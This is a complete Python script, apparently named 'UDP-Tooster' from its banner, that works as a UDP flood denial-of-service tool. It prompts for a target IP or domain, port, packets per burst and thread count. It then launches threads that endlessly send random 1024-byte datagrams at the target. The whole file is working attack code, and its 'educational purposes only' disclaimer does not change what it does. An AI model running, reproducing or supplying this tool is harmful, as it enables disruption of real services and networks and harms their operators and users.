import os
import sys
import random
import socket
import threading
import ipaddress

# Clear console
os.system('clear' if os.name == 'posix' else 'cls')

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def run(ip, port, times):
    data = random._urandom(1024)
    try:
        while True:
            print(f"[*] Sending UDP packets to {ip}:{port}!")
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, addr)
            s.close()
    except KeyboardInterrupt:
        print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

def main():
    print("\n█░█░█▀▄░█▀█      ▀█▀ █▀█ █▀█ █▀ ▀█▀ █▀▀ █▀█")
    print("█▄█░█▄█░█▀▀░ ▀▀▀ ░█░ █▄█ ▀▀█ ▄█ ░█░ ██▄ █▀▄\n")
    print("[Warning] This tool is for educational purposes only. I am not responsible for any damages caused by its misuse. Use it at your own risk!\n")
    
    while True:
        try:
            target = input("[#] Enter target IP or domain: ")
            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print("[!] Invalid input. Please enter a valid target IP or domain.")
        except KeyboardInterrupt:
            print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
            sys.exit(0)
    
    if not is_valid_ipv4(target):
        try:
            ip = socket.gethostbyname(target)
            print(f"[+] Resolved {target} to {ip}")
        except socket.error as e:
            print(f"[!] Error resolving the target: {e}")
            sys.exit(1)
    else:
        ip = target

    while True:
        try:
            port = int(input("[#] Enter target port: "))
            break
        except ValueError:
            print("[!] Invalid input. Please enter a valid integer for the port.")
        except KeyboardInterrupt:
            print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
            sys.exit(0)

    while True:
        try:
            times_input = input("[#] Enter packets per connection: ")
            if times_input.strip():
                times = int(times_input)
                break
            else:
                print("[!] Invalid input. Please enter a valid integer for the packets.")
        except ValueError:
            print("[!] Invalid input. Please enter a valid integer for the packets.")
        except KeyboardInterrupt:
            print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
            sys.exit(0)

    while True:
        try:
            threads_input = input("[#] Enter number of threads: ")
            if threads_input.strip():
                threads = int(threads_input)
                break
            else:
                print("[!] Invalid input. Please enter a valid integer for the threads.")
        except ValueError:
            print("[!] Invalid input. Please enter a valid integer for the threads.")
        except KeyboardInterrupt:
            print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
            sys.exit(0)

    for _ in range(threads):
        th = threading.Thread(target=run, args=(ip, port, times))
        th.start()

if __name__ == "__main__":
    main()
